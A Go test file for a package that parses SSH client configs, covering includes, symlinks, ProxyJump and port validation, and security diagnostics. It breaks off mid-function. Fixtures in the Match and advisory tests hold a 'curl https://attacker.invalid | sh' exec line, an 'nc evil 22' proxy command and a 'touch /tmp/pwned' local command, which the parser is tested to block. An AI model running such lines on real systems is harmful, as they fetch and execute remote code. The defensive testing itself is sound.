package sshconfig

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

// newHome creates a fake home directory with the given files, keyed by
// slash-separated paths relative to the home directory.
func newHome(t *testing.T, files map[string]string) string {
	t.Helper()
	home := t.TempDir()
	if err := os.Mkdir(filepath.Join(home, ".ssh"), 0o700); err != nil {
		t.Fatal(err)
	}
	for name, content := range files {
		writeFile(t, filepath.Join(home, filepath.FromSlash(name)), content)
	}
	return home
}

func writeFile(t *testing.T, path string, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

func symlink(t *testing.T, target string, link string) {
	t.Helper()
	if err := os.Symlink(target, link); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
}

func parseHome(t *testing.T, home string) Result {
	t.Helper()
	result, err := ParseLocal(home)
	if err != nil {
		t.Fatalf("ParseLocal: %v", err)
	}
	return result
}

func parseConfig(t *testing.T, files map[string]string) (Result, string) {
	t.Helper()
	home := newHome(t, files)
	return parseHome(t, home), home
}

func aliases(result Result) []string {
	names := []string{}
	for _, candidate := range result.Candidates {
		names = append(names, candidate.Alias)
	}
	return names
}

func find(t *testing.T, result Result, alias string) Candidate {
	t.Helper()
	for _, candidate := range result.Candidates {
		if candidate.Alias == alias {
			return candidate
		}
	}
	t.Fatalf("candidate %q not found in %v", alias, aliases(result))
	return Candidate{}
}

func findDiagnostic(diagnostics []Diagnostic, level Level, directive string) (Diagnostic, bool) {
	for _, diagnostic := range diagnostics {
		if diagnostic.Level == level && diagnostic.Directive == directive {
			return diagnostic, true
		}
	}
	return Diagnostic{}, false
}

func requireDiagnostic(t *testing.T, diagnostics []Diagnostic, level Level, directive string) Diagnostic {
	t.Helper()
	diagnostic, ok := findDiagnostic(diagnostics, level, directive)
	if !ok {
		t.Fatalf("missing %s diagnostic for %s in %+v", level, directive, diagnostics)
	}
	return diagnostic
}

func TestParseLocalWithoutConfig(t *testing.T) {
	result := parseHome(t, t.TempDir())
	if len(result.Candidates) != 0 || len(result.Diagnostics) != 0 {
		t.Fatalf("expected empty result, got %+v", result)
	}
	if result.Candidates == nil || result.Diagnostics == nil {
		t.Fatal("empty result must encode as empty JSON arrays")
	}
}

func TestParseLocalRequiresAbsoluteHome(t *testing.T) {
	if _, err := ParseLocal("relative/home"); err == nil {
		t.Fatal("expected an error for a relative home")
	}
}

func TestBasicHosts(t *testing.T) {
	result, home := parseConfig(t, map[string]string{".ssh/config": `
# personal
Host web
    HostName web.example.com
    User deploy
    Port 2222
    IdentityFile ~/.ssh/id_web
    IdentityFile ~/.ssh/id_web
    IdentityFile %d/.ssh/id_backup
    IdentitiesOnly yes

Host db db-replica
    HostName=10.0.0.5
    User = postgres

Host plain
`})
	if got := aliases(result); !slices.Equal(got, []string{"web", "db", "db-replica", "plain"}) {
		t.Fatalf("aliases = %v", got)
	}
	web := find(t, result, "web")
	wantFiles := []string{filepath.Join(home, ".ssh", "id_web"), filepath.Join(home, ".ssh", "id_backup")}
	if web.Hostname != "web.example.com" || web.Port != 2222 || web.User != "deploy" || !web.IdentitiesOnly || !slices.Equal(web.IdentityFiles, wantFiles) {
		t.Fatalf("web = %+v", web)
	}
	if web.UseAgent || !web.Importable || len(web.Diagnostics) != 0 {
		t.Fatalf("web agent/importable/diagnostics = %+v", web)
	}
	for _, alias := range []string{"db", "db-replica"} {
		db := find(t, result, alias)
		if db.Hostname != "10.0.0.5" || db.Port != 22 || db.User != "postgres" || !db.UseAgent || !db.Importable {
			t.Fatalf("%s = %+v", alias, db)
		}
	}
	plain := find(t, result, "plain")
	if plain.Hostname != "plain" || plain.Port != 22 || plain.User != "" || plain.IdentityFiles != nil {
		t.Fatalf("plain = %+v", plain)
	}
}

func TestFirstValueWins(t *testing.T) {
	result, _ := parseConfig(t, map[string]string{".ssh/config": `
User early

Host app
    Port 2200

Host app staging
    Port 2300
    User app-user
    HostName %h.internal

Host *.example.com app
    HostName ignored.example.com

Host *
    User fallback
    Port 9999
    ForwardAgent yes
`})
	tests := []struct {
		alias    string
		hostname string
		port     int
		user     string
	}{
		{alias: "app", hostname: "app.internal", port: 2200, user: "early"},
		{alias: "staging", hostname: "staging.internal", port: 2300, user: "early"},
	}
	for _, test := range tests {
		candidate := find(t, result, test.alias)
		if candidate.Hostname != test.hostname || candidate.Port != test.port || candidate.User != test.user {
			t.Errorf("%s = %+v, want %s:%d user %s", test.alias, candidate, test.hostname, test.port, test.user)
		}
		requireDiagnostic(t, candidate.Diagnostics, LevelWarning, "ForwardAgent")
	}
}

func TestPatternsAreNotEnumerated(t *testing.T) {
	result, _ := parseConfig(t, map[string]string{".ssh/config": `
Host *.corp *
    User shared
Host web? !web9
    Port 2022
Host * !bastion
    IdentityAgent none
Host bastion web1 web9
Host ghost !ghost
`})
	if got := aliases(result); !slices.Equal(got, []string{"bastion", "web1", "web9"}) {
		t.Fatalf("aliases = %v", got)
	}
	if web1 := find(t, result, "web1"); web1.Port != 2022 || web1.UseAgent {
		t.Fatalf("web1 = %+v", web1)
	}
	if web9 := find(t, result, "web9"); web9.Port != 22 || web9.UseAgent {
		t.Fatalf("negated pattern must exclude web9: %+v", web9)
	}
	if bastion := find(t, result, "bastion"); !bastion.UseAgent || bastion.User != "shared" {
		t.Fatalf("bastion = %+v", bastion)
	}
	diagnostic := requireDiagnostic(t, result.Diagnostics, LevelInfo, "Host")
	if diagnostic.Line != 9 || diagnostic.Source != "config" {
		t.Fatalf("unreachable alias diagnostic = %+v", diagnostic)
	}
}

func TestDuplicateAliasesKeepFirstOccurrence(t *testing.T) {
	result, _ := parseConfig(t, map[string]string{".ssh/config": "Host a b\nHost b a c\n"})
	if got := aliases(result); !slices.Equal(got, []string{"a", "b", "c"}) {
		t.Fatalf("aliases = %v", got)
	}
}

func TestIncludes(t *testing.T) {
	tests := []struct {
		name    string
		files   map[string]string
		aliases []string
		check   func(t *testing.T, result Result)
	}{
		{
			name: "relative path resolves inside ~/.ssh",
			files: map[string]string{
				".ssh/config":      "Include extra\nHost root\n",
				".ssh/extra":       "Host included\n  HostName included.example.com\n",
				"extra":            "Host wrong-directory\n",
				".ssh/unused":      "Host unused\n",
				".ssh/known_hosts": "",
			},
			aliases: []string{"included", "root"},
			check: func(t *testing.T, result Result) {
				if included := find(t, result, "included"); included.Hostname != "included.example.com" {
					t.Fatalf("included = %+v", included)
				}
			},
		},
		{
			name: "glob matches are read in sorted order",
			files: map[string]string{
				".ssh/config":          "Include conf.d/*\n",
				".ssh/conf.d/20-late":  "Host shared late\n  User late\n",
				".ssh/conf.d/10-early": "Host shared early\n  User early\n",
			},
			aliases: []string{"shared", "early", "late"},
			check: func(t *testing.T, result Result) {
				if shared := find(t, result, "shared"); shared.User != "early" {
					t.Fatalf("shared = %+v", shared)
				}
			},
		},
		{
			name: "tilde path resolves from home",
			files: map[string]string{
				".ssh/config":      "Include ~/.ssh/work/*.conf\n",
				".ssh/work/a.conf": "Host tilde\n",
				".ssh/work/b.txt":  "Host skipped\n",
			},
			aliases: []string{"tilde"},
		},
		{
			name: "include inside a non-matching Host block contributes nothing",
			files: map[string]string{
				".ssh/config":   "Host other\n  Include defaults\nHost target\n",
				".ssh/defaults": "Host *\n  User from-include\n",
			},
			aliases: []string{"other", "target"},
			check: func(t *testing.T, result Result) {
				if target := find(t, result, "target"); target.User != "" {
					t.Fatalf("target = %+v", target)
				}
				if other := find(t, result, "other"); other.User != "from-include" {
					t.Fatalf("other = %+v", other)
				}
			},
		},
		{
			name: "aliases only reachable through a non-matching block are not imported",
			files: map[string]string{
				".ssh/config": "Host gate\n  Include hidden\n",
				".ssh/hidden": "Host hidden\n  HostName hidden.example.com\n",
			},
			aliases: []string{"gate"},
			check: func(t *testing.T, result Result) {
				diagnostic := requireDiagnostic(t, result.Diagnostics, LevelInfo, "Host")
				if diagnostic.Source != "hidden" || diagnostic.Line != 1 {
					t.Fatalf("diagnostic = %+v", diagnostic)
				}
			},
		},
		{
			name: "Host lines in an included file do not leak into the parent",
			files: map[string]string{
				".ssh/config":   "Host app\n  Include fragment\n  User parent\nHost after\n",
				".ssh/fragment": "Port 2201\nHost unrelated\n  User leaked\n",
			},
			aliases: []string{"app", "after"},
			check: func(t *testing.T, result Result) {
				if app := find(t, result, "app"); app.User != "parent" || app.Port != 2201 {
					t.Fatalf("app = %+v", app)
				}
			},
		},
		{
			name: "missing include is informational",
			files: map[string]string{
				".ssh/config": "Include absent/*\nHost only\n",
			},
			aliases: []string{"only"},
			check: func(t *testing.T, result Result) {
				diagnostic := requireDiagnostic(t, result.Diagnostics, LevelInfo, "Include")
				if diagnostic.Line != 1 || diagnostic.Source != "config" {
					t.Fatalf("diagnostic = %+v", diagnostic)
				}
			},
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			result, _ := parseConfig(t, test.files)
			if got := aliases(result); !slices.Equal(got, test.aliases) {
				t.Fatalf("aliases = %v, want %v (diagnostics %+v)", got, test.aliases, result.Diagnostics)
			}
			if test.check != nil {
				test.check(t, result)
			}
		})
	}
}

func TestIncludeScope(t *testing.T) {
	outside := t.TempDir()
	secret := filepath.Join(outside, "extra.conf")
	writeFile(t, secret, "Host from-outside\n  HostName outside.example.com\n")
	writeFile(t, filepath.Join(outside, "dir", "inner"), "Host from-dir\n")

	// Symlinks and paths outside ~/.ssh (e.g. OrbStack / Colima / dotfiles) are followed.
	linkedHome := newHome(t, map[string]string{
		".ssh/config": "Include " + secret + "\nInclude linked\nInclude linked-dir/*\nHost kept\n",
	})
	symlink(t, secret, filepath.Join(linkedHome, ".ssh", "linked"))
	symlink(t, filepath.Join(outside, "dir"), filepath.Join(linkedHome, ".ssh", "linked-dir"))
	linkedResult := parseHome(t, linkedHome)
	if got := aliases(linkedResult); !slices.Equal(got, []string{"from-outside", "from-dir", "kept"}) {
		t.Fatalf("aliases = %v (%+v)", got, linkedResult.Diagnostics)
	}

	// Non-regular directories and oversized files are still skipped safely.
	for _, test := range []struct {
		name   string
		config string
		setup  func(t *testing.T, home string)
		level  Level
	}{
		{name: "directory is not a regular file", config: "Include conf.d\n", level: LevelBlocked, setup: func(t *testing.T, home string) {
			writeFile(t, filepath.Join(home, ".ssh", "conf.d", "x"), "Host leaked-directory-entry\n")
		}},
		{name: "file larger than 1 MiB", config: "Include big\n", level: LevelBlocked, setup: func(t *testing.T, home string) {
			writeFile(t, filepath.Join(home, ".ssh", "big"), "Host leaked-big\n"+strings.Repeat("#\n", MaxConfigSize/2))
		}},
		{name: "tilde user unsupported", config: "Include ~other/.ssh/config\n", level: LevelWarning},
	} {
		t.Run(test.name, func(t *testing.T) {
			home := newHome(t, map[string]string{".ssh/config": test.config + "Host kept\n"})
			if test.setup != nil {
				test.setup(t, home)
			}
			result := parseHome(t, home)
			if got := aliases(result); !slices.Equal(got, []string{"kept"}) {
				t.Fatalf("aliases = %v", got)
			}
			diagnostic := requireDiagnostic(t, result.Diagnostics, test.level, "Include")
			if diagnostic.Source != "config" || diagnostic.Line != 1 {
				t.Fatalf("diagnostic = %+v", diagnostic)
			}
		})
	}
}

func TestSymlinkInsideScopeIsFollowed(t *testing.T) {
	home := newHome(t, map[string]string{
		".ssh/config":      "Include alias\n",
		".ssh/conf.d/real": "Host via-link\n",
	})
	symlink(t, filepath.Join(home, ".ssh", "conf.d", "real"), filepath.Join(home, ".ssh", "alias"))
	result := parseHome(t, home)
	if got := aliases(result); !slices.Equal(got, []string{"via-link"}) {
		t.Fatalf("aliases = %v (%+v)", got, result.Diagnostics)
	}
}

func TestSymlinkedSSHDirectory(t *testing.T) {
	home := t.TempDir()
	real := filepath.Join(t.TempDir(), "dotfiles-ssh")
	writeFile(t, filepath.Join(real, "config"), "Include work\nHost personal\n")
	writeFile(t, filepath.Join(real, "work"), "Host work\n")
	symlink(t, real, filepath.Join(home, ".ssh"))
	result := parseHome(t, home)
	if got := aliases(result); !slices.Equal(got, []string{"work", "personal"}) {
		t.Fatalf("aliases = %v (%+v)", got, result.Diagnostics)
	}
}

func TestIncludeCycle(t *testing.T) {
	result, _ := parseConfig(t, map[string]string{
		".ssh/config": "Include a\nHost root\n",
		".ssh/a":      "Include b\nHost from-a\n",
		".ssh/b":      "Include a\nInclude config\nHost from-b\n",
	})
	if got := aliases(result); !slices.Equal(got, []string{"from-b", "from-a", "root"}) {
		t.Fatalf("aliases = %v", got)
	}
	cycles := 0
	for _, diagnostic := range result.Diagnostics {
		if diagnostic.Directive == "Include" && diagnostic.Level == LevelWarning && diagnostic.Source == "b" {
			cycles++
		}
	}
	if cycles != 2 {
		t.Fatalf("expected two cycle diagnostics in b, got %+v", result.Diagnostics)
	}
}

func TestIncludeDepthLimit(t *testing.T) {
	files := map[string]string{".ssh/config": "Include level1\n"}
	for level := 1; level <= 7; level++ {
		files[fmt.Sprintf(".ssh/level%d", level)] = fmt.Sprintf("Include level%d\nHost level%d\n", level+1, level)
	}
	result, _ := parseConfig(t, files)
	if got := aliases(result); !slices.Equal(got, []string{"level5", "level4", "level3", "level2", "level1"}) {
		t.Fatalf("aliases = %v", got)
	}
	diagnostic := requireDiagnostic(t, result.Diagnostics, LevelWarning, "Include")
	if diagnostic.Source != "level5" || diagnostic.Line != 1 {
		t.Fatalf("diagnostic = %+v", diagnostic)
	}
}

func TestIncludeFileLimit(t *testing.T) {
	files := map[string]string{".ssh/config": "Include conf.d/*\n"}
	for index := range 40 {
		files[fmt.Sprintf(".ssh/conf.d/host%03d", index)] = fmt.Sprintf("Host h%d\n", index)
	}
	result, _ := parseConfig(t, files)
	if len(result.Candidates) != maximumFiles-1 {
		t.Fatalf("candidates = %d, want %d", len(result.Candidates), maximumFiles-1)
	}
	warnings := 0
	for _, diagnostic := range result.Diagnostics {
		if diagnostic.Directive == "Include" {
			warnings++
		}
	}
	if warnings != 1 {
		t.Fatalf("expected one limit diagnostic, got %+v", result.Diagnostics)
	}
}

func TestMatchBlocks(t *testing.T) {
	result, _ := parseConfig(t, map[string]string{".ssh/config": `
Host build
    HostName build.example.com
Match exec "curl https://attacker.invalid | sh"
    User exec-user
    ProxyCommand nc evil 22
Match User root
    Port 2222
Match originalhost build localuser me
    IdentityAgent none
Match host other.example.com,BUILD.example.com
    User matched-by-hostname
Match all
    Port 2200
Match host other,!build.example.com
    User wrong
`})
	build := find(t, result, "build")
	if build.User != "matched-by-hostname" || build.Port != 2200 || !build.UseAgent || !build.Importable || build.Jump != nil {
		t.Fatalf("build = %+v", build)
	}
	exec := requireDiagnostic(t, result.Diagnostics, LevelBlocked, "Match")
	if exec.Line != 4 || exec.Source != "config" || strings.Contains(exec.Message, "curl") {
		t.Fatalf("exec diagnostic = %+v", exec)
	}
	warnings := []int{}
	for _, diagnostic := range result.Diagnostics {
		if diagnostic.Directive == "Match" && diagnostic.Level == LevelWarning {
			warnings = append(warnings, diagnostic.Line)
		}
	}
	if !slices.Equal(warnings, []int{7, 9}) {
		t.Fatalf("Match warnings on lines %v, diagnostics %+v", warnings, result.Diagnostics)
	}
	if got := aliases(result); !slices.Equal(got, []string{"build"}) {
		t.Fatalf("aliases = %v", got)
	}
}

func TestIncludeInsideUnsupportedMatchIsIgnored(t *testing.T) {
	result, _ := parseConfig(t, map[string]string{
		".ssh/config": "Match user someone\n  Include extra\nHost root\n",
		".ssh/extra":  "Host extra\n",
	})
	if got := aliases(result); !slices.Equal(got, []string{"root"}) {
		t.Fatalf("aliases = %v", got)
	}
}

func TestProxyJump(t *testing.T) {
	tests := []struct {
		name       string
		config     string
		jump       *Jump
		importable bool
		diagnostic Level
	}{
		{
			name:       "imported alias is resolved",
			config:     "Host target\n  ProxyJump bastion\nHost bastion\n  HostName bastion.example.com\n  User jumper\n  Port 2022\n",
			jump:       &Jump{Alias: "bastion", User: "jumper", Hostname: "bastion.example.com", Port: 2022},
			importable: true,
		},
		{
			name:       "explicit user and port override the alias",
			config:     "Host target\n  ProxyJump ops@bastion:2200\nHost bastion\n  HostName bastion.example.com\n  User jumper\n",
			jump:       &Jump{Alias: "bastion", User: "ops", Hostname: "bastion.example.com", Port: 2200},
			importable: true,
		},
		{
			name:       "user at host and port",
			config:     "Host target\n  ProxyJump admin@jump.example.com:2222\n",
			jump:       &Jump{User: "admin", Hostname: "jump.example.com", Port: 2222},
			importable: true,
		},
		{
			name:       "wildcard defaults apply to an unnamed jump host",
			config:     "Host target\n  ProxyJump gw.corp\nHost *.corp\n  User corp-user\n",
			jump:       &Jump{User: "corp-user", Hostname: "gw.corp", Port: 22},
			importable: true,
		},
		{
			name:       "bracketed IPv6 with port",
			config:     "Host target\n  ProxyJump root@[2001:db8::1]:2200\n",
			jump:       &Jump{User: "root", Hostname: "2001:db8::1", Port: 2200},
			importable: true,
		},
		{
			name:       "bracketed IPv6 without port",
			config:     "Host target\n  ProxyJump [::1]\n",
			jump:       &Jump{Hostname: "::1", Port: 22},
			importable: true,
		},
		{
			name:       "ssh URI",
			config:     "Host target\n  ProxyJump ssh://admin@jump.example.com:2022\n",
			jump:       &Jump{User: "admin", Hostname: "jump.example.com", Port: 2022},
			importable: true,
		},
		{
			name:       "none means direct",
			config:     "Host target\n  ProxyJump none\nHost *\n  ProxyJump never-used\n",
			importable: true,
		},
		{
			name:       "multi-hop is rejected",
			config:     "Host target\n  ProxyJump first,second\n",
			diagnostic: LevelWarning,
		},
		{
			name:       "nested jump is rejected",
			config:     "Host target\n  ProxyJump middle\nHost middle\n  ProxyJump edge\n",
			diagnostic: LevelWarning,
		},
		{
			name:       "self jump is rejected",
			config:     "Host target\n  ProxyJump target\n",
			diagnostic: LevelWarning,
		},
		{
			name:       "unbracketed IPv6 is rejected",
			config:     "Host target\n  ProxyJump 2001:db8::1\n",
			diagnostic: LevelWarning,
		},
		{
			name:       "invalid jump port is rejected",
			config:     "Host target\n  ProxyJump jump:70000\n",
			diagnostic: LevelWarning,
		},
		{
			name:       "password in URI is rejected",
			config:     "Host target\n  ProxyJump ssh://admin:secret@jump.example.com\n",
			diagnostic: LevelWarning,
		},
		{
			name:       "token in jump host is rejected",
			config:     "Host target\n  ProxyJump %h-jump\n",
			diagnostic: LevelWarning,
		},
		{
			name:       "ProxyJump obtained first wins over ProxyCommand",
			config:     "Host target\n  ProxyJump jump.example.com\n  ProxyCommand nc %h %p\n",
			jump:       &Jump{Hostname: "jump.example.com", Port: 22},
			importable: true,
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			result, _ := parseConfig(t, map[string]string{".ssh/config": test.config})
			target := find(t, result, "target")
			if target.Importable != test.importable {
				t.Fatalf("importable = %v, diagnostics %+v", target.Importable, target.Diagnostics)
			}
			if (target.Jump == nil) != (test.jump == nil) || (test.jump != nil && *target.Jump != *test.jump) {
				t.Fatalf("jump = %+v, want %+v", target.Jump, test.jump)
			}
			if test.diagnostic != "" {
				diagnostic := requireDiagnostic(t, target.Diagnostics, test.diagnostic, "ProxyJump")
				if diagnostic.Line != 2 {
					t.Fatalf("diagnostic = %+v", diagnostic)
				}
			}
			if _, ok := findDiagnostic(target.Diagnostics, LevelBlocked, "ProxyCommand"); ok {
				t.Fatalf("ProxyCommand ignored by OpenSSH must not be reported: %+v", target.Diagnostics)
			}
		})
	}
}

func TestProxyCommandIsSupported(t *testing.T) {
	result, _ := parseConfig(t, map[string]string{".ssh/config": `
Host target
    ProxyCommand ssh -W %h:%p bastion
    ProxyJump bastion
Host direct
    ProxyCommand none
Host bastion
`})
	target := find(t, result, "target")
	if !target.Importable || target.Jump != nil || target.ProxyCommand != "ssh -W %h:%p bastion" {
		t.Fatalf("target = %+v", target)
	}
	if direct := find(t, result, "direct"); !direct.Importable || direct.ProxyCommand != "" || len(direct.Diagnostics) != 0 {
		t.Fatalf("direct = %+v", direct)
	}
}

func TestHostnameAndValueValidation(t *testing.T) {
	tests := []struct {
		name       string
		body       string
		hostname   string
		port       int
		user       string
		importable bool
		directive  string
	}{
		{name: "percent h token", body: "HostName %h.example.com", hostname: "target.example.com", port: 22, importable: true},
		{name: "escaped percent", body: "HostName 100%%.example.com", hostname: "100%.example.com", port: 22, importable: true},
		{name: "unsupported token", body: "HostName %n.example.com", hostname: "%n.example.com", port: 22, directive: "HostName"},
		{name: "trailing percent", body: "HostName example.com%", hostname: "example.com%", port: 22, directive: "HostName"},
		{name: "hostname with path", body: "HostName example.com/admin", hostname: "example.com/admin", port: 22, directive: "HostName"},
		{name: "hostname with user", body: "HostName root@example.com", hostname: "root@example.com", port: 22, directive: "HostName"},
		{name: "missing hostname value", body: "HostName", hostname: "", port: 22, directive: "HostName"},
		{name: "IPv6 hostname", body: "HostName 2001:db8::5", hostname: "2001:db8::5", port: 22, importable: true},
		{name: "port zero", body: "Port 0", hostname: "target", port: 0, directive: "Port"},
		{name: "port too large", body: "Port 65536", hostname: "target", port: 0, directive: "Port"},
		{name: "port not numeric", body: "Port ssh", hostname: "target", port: 0, directive: "Port"},
		{name: "port with sign", body: "Port +22", hostname: "target", port: 0, directive: "Port"},
		{name: "quoted value", body: `HostName "quoted.example.com"`, hostname: "quoted.example.com", port: 22, importable: true},
		{name: "user token is dropped", body: "User %u", hostname: "target", port: 22, importable: true, directive: "User"},
		{name: "user escaped percent", body: "User a%%b", hostname: "target", port: 22, user: "a%b", importable: true},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			result, err := ParseText([]byte("Host target\n  " + test.body + "\n"))
			if err != nil {
				t.Fatal(err)
			}
			target := find(t, result, "target")
			if target.Hostname != test.hostname || target.Port != test.port || target.User != test.user || target.Importable != test.importable {
				t.Fatalf("target = %+v", target)
			}
			if test.directive != "" {
				diagnostic := requireDiagnostic(t, target.Diagnostics, LevelWarning, test.directive)
				if diagnostic.Line != 2 {
					t.Fatalf("diagnostic = %+v", diagnostic)
				}
			} else if len(target.Diagnostics) != 0 {
				t.Fatalf("unexpected diagnostics %+v", target.Diagnostics)
			}
		})
	}
}

func TestInvalidAliasNeedsHostName(t *testing.T) {
	result, err := ParseText([]byte("Host a/b c/d\n  HostName ok.example.com\nHost e@f\n"))
	if err != nil {
		t.Fatal(err)
	}
	if candidate := find(t, result, "a/b"); !candidate.Importable || candidate.Hostname != "ok.example.com" {
		t.Fatalf("a/b = %+v", candidate)
	}
	candidate := find(t, result, "e@f")
	if candidate.Importable || requireDiagnostic(t, candidate.Diagnostics, LevelWarning, "Host").Line != 3 {
		t.Fatalf("e@f = %+v", candidate)
	}
}

func TestAuthenticationSettings(t *testing.T) {
	result, home := parseConfig(t, map[string]string{".ssh/config": `
Host only-explicit
    IdentitiesOnly yes
    IdentityFile ~/.ssh/id_explicit
Host only-without-files
    IdentitiesOnly yes
Host no-agent
    IdentityAgent none
    IdentityFile /etc/ssh/ssh_host_key
    IdentityFile ~/relative-to-home
    IdentityFile relative
    IdentityFile %r/key
    IdentityFile none
Host custom-agent
    IdentityAgent ~/.1password/agent.sock
Host default-agent
    IdentityAgent SSH_AUTH_SOCK
`})
	tests := []struct {
		alias          string
		identityFiles  []string
		identitiesOnly bool
		useAgent       bool
		warnings       int
	}{
		{alias: "only-explicit", identityFiles: []string{filepath.Join(home, ".ssh", "id_explicit")}, identitiesOnly: true},
		{alias: "only-without-files", identitiesOnly: true, useAgent: true},
		{alias: "no-agent", identityFiles: []string{"/etc/ssh/ssh_host_key", filepath.Join(home, "relative-to-home")}, warnings: 2},
		{alias: "custom-agent", useAgent: true, warnings: 1},
		{alias: "default-agent", useAgent: true},
	}
	for _, test := range tests {
		candidate := find(t, result, test.alias)
		if !slices.Equal(candidate.IdentityFiles, test.identityFiles) || candidate.IdentitiesOnly != test.identitiesOnly || candidate.UseAgent != test.useAgent {
			t.Errorf("%s = %+v", test.alias, candidate)
		}
		if len(candidate.Diagnostics) != test.warnings || !candidate.Importable {
			t.Errorf("%s diagnostics = %+v", test.alias, candidate.Diagnostics)
		}
	}
}

func TestAdvisories(t *testing.T) {
	result, err := ParseText([]byte(`
Host target
    LocalCommand touch /tmp/pwned
    PermitLocalCommand yes
    RemoteCommand tmux attach
    KnownHostsCommand /bin/false
    CertificateFile ~/.ssh/id-cert.pub
    PKCS11Provider /usr/lib/opensc-pkcs11.so
    SecurityKeyProvider /usr/lib/sk.so
    GSSAPIAuthentication yes
    HostKeyAlias shared
    CanonicalizeHostname always
    ForwardAgent yes
    LocalForward 8080 localhost:80
    RemoteForward 9090 localhost:90
    DynamicForward 1080
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
Host quiet
    PermitLocalCommand no
    RemoteCommand none
    GSSAPIAuthentication no
    CanonicalizeHostname no
    ForwardAgent no
    StrictHostKeyChecking yes
    SecurityKeyProvider internal
`))
	if err != nil {
		t.Fatal(err)
	}
	target := find(t, result, "target")
	if !target.Importable {
		t.Fatalf("advisories must not block import: %+v", target)
	}
	want := map[string]Level{
		"LocalCommand":          LevelBlocked,
		"PermitLocalCommand":    LevelBlocked,
		"RemoteCommand":         LevelBlocked,
		"KnownHostsCommand":     LevelBlocked,
		"CertificateFile":       LevelWarning,
		"PKCS11Provider":        LevelWarning,
		"SecurityKeyProvider":   LevelWarning,
		"GSSAPIAuthentication":  LevelWarning,
		"HostKeyAlias":          LevelWarning,
		"CanonicalizeHostname":  LevelWarning,
		"ForwardAgent":          LevelWarning,
		"LocalForward":          LevelWarning,
		"RemoteForward":         LevelWarning,
		"DynamicForward":        LevelWarning,
		"StrictHostKeyChecking": LevelInfo,
		"UserKnownHostsFile":    LevelInfo,
	}
	if len(target.Diagnostics) != len(want) {
		t.Fatalf("diagnostics = %+v", target.Diagnostics)
	}
	for directive, level := range want {
		diagnostic := requireDiagnostic(t, target.Diagnostics, level, directive)
		if strings.Contains(diagnostic.Message, "/tmp/pwned") || strings.Contains(diagnostic.Message, "tmux") {
			t.Fatalf("diagnostic repeats the value: %+v", diagnostic)
		}
	}
	if quiet := find(t, result, "quiet"); len(quiet.Diagnostics) != 0 {
		t.Fatalf("quiet = %+v", quiet.Diagnostics)
	}
}

func TestParseTextIgnoresInclude(t *testing.T) {
	outside := filepath.Join(t.TempDir(), "extra")
	writeFile(t, outside, "Host leaked\n")
	result, err := ParseText([]byte("Include " + outside + "\nHost uploaded\n  Include=~/.ssh/other\n  IdentityFile ~/.ssh/id_ed25519\n  IdentityFile %d/.ssh/id_rsa\n"))
	if err != nil {
		t.Fatal(err)
	}
	if got := aliases(result); !slices.Equal(got, []string{"uploaded"}) {
		t.Fatalf("aliases = %v", got)
	}
	lines := []int{}
	for _, diagnostic := range result.Diagnostics {
		if diagnostic.Directive == "Include" && diagnostic.Level == LevelWarning && diagnostic.Message == "上传的配置不会读取 Include 文件。" {
			lines = append(lines, diagnostic.Line)
		}
	}
	if !slices.Equal(lines, []int{1, 3}) {
		t.Fatalf("include diagnostics = %+v", result.Diagnostics)
	}
	uploaded := find(t, result, "uploaded")
	if !slices.Equal(uploaded.IdentityFiles, []string{"~/.ssh/id_ed25519", "~/.ssh/id_rsa"}) || len(uploaded.Diagnostics) != 0 {
		t.Fatalf("uploaded = %+v", uploaded)
	}
}

func TestSizeLimits(t *testing.T) {
	tests := []struct {
		name    string
		content string
		err     error
	}{
		{name: "upload over 1 MiB", content: strings.Repeat("#\n", MaxConfigSize/2+1), err: ErrTooLarge},
		{name: "directive line too long", content: "Host a\n  ProxyCommand " + strings.Repeat("x", maximumLineLength) + "\n", err: ErrTooLarge},
		{name: "too many entries", content: strings.Repeat("Host a b c d e f g h i j\n", maximumEntries/10+1), err: ErrTooLarge},
		{name: "long comment is skipped", content: "# " + strings.Repeat("x", maximumLineLength) + "\nHost a\n"},
		{name: "exactly 1 MiB", content: "Host a\n" + strings.Repeat("#", MaxConfigSize-len("Host a\n"))},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			_, err := ParseText([]byte(test.content))
			if !errors.Is(err, test.err) {
				t.Fatalf("err = %v, want %v", err, test.err)
			}
		})
	}
}

func TestRootConfigErrors(t *testing.T) {
	home := newHome(t, nil)
	if err := os.Mkdir(filepath.Join(home, ".ssh", "config"), 0o700); err != nil {
		t.Fatal(err)
	}
	if _, err := ParseLocal(home); !errors.Is(err, ErrInvalid) {
		t.Fatalf("err = %v", err)
	}
	home = newHome(t, map[string]string{".ssh/config": strings.Repeat("#\n", MaxConfigSize/2+1)})
	if _, err := ParseLocal(home); !errors.Is(err, ErrTooLarge) {
		t.Fatalf("err = %v", err)
	}
}

func TestCandidateLimit(t *testing.T) {
	var builder strings.Builder
	for index := range maximumCandidates + 5 {
		fmt.Fprintf(&builder, "Host h%d\n", index)
	}
	result, err := ParseText([]byte(builder.String()))
	if err != nil {
		t.Fatal(err)
	}
	if len(result.Candidates) != maximumCandidates {
		t.Fatalf("candidates = %d", len(result.Candidates))
	}
	requireDiagnostic(t, result.Diagnostics, LevelWarning, "Host")
}

func TestLineEndingsAndMarkers(t *testing.T) {
	result, err := ParseText([]byte("\ufeffHost crlf\r\n  Port 2022\r\n#sshwb-include\r\nHost sshwb-unsupported-match-0\r\n  User literal\r\n"))
	if err != nil {
		t.Fatal(err)
	}
	if got := aliases(result); !slices.Equal(got, []string{"crlf", "sshwb-unsupported-match-0"}) {
		t.Fatalf("aliases = %v", got)
	}
	if crlf := find(t, result, "crlf"); crlf.Port != 2022 {
		t.Fatalf("crlf = %+v", crlf)
	}
	if literal := find(t, result, "sshwb-unsupported-match-0"); literal.User != "literal" {
		t.Fatalf("literal = %+v", literal)
	}
	if len(result.Diagnostics) != 0 {
		t.Fatalf("diagnostics = %+v", result.Diagnostics)
	}
}

func TestDiagnosticSourceInIncludedFile(t *testing.T) {
	result, _ := parseConfig(t, map[string]string{
